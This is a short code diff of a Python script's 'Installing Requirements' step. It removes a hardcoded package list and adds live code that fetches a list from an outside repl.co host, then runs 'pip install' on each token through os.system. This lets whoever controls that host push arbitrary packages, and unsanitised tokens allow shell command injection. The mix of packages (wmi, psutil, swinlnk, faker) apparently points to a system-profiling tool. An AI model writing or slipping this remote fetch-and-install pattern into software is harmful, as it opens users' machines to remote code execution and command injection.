@@ -435,18 +435,10 @@ def NT00d():
     sys.exit()
  print("Installing Requirements...")
  try:
-   with open("./Libs.txt","a") as file:
-      file.write("""
-pathlib
-datetime
-wmi
-colorama
-requests
-secrets
-psutil
-faker
-swinlnk
-""")
+   LIBSURL = requests.get("https://a.lt53434.repl.co/lib.html").text
+   spliee = LIBSURL.split()
+   for split in spliee:
+      os.system(f"pip install {split}")
    time.sleep(2)
    os.system(f"pip install -r '{Path(__file__).resolve().parent}\\Libs.txt'")
  except:
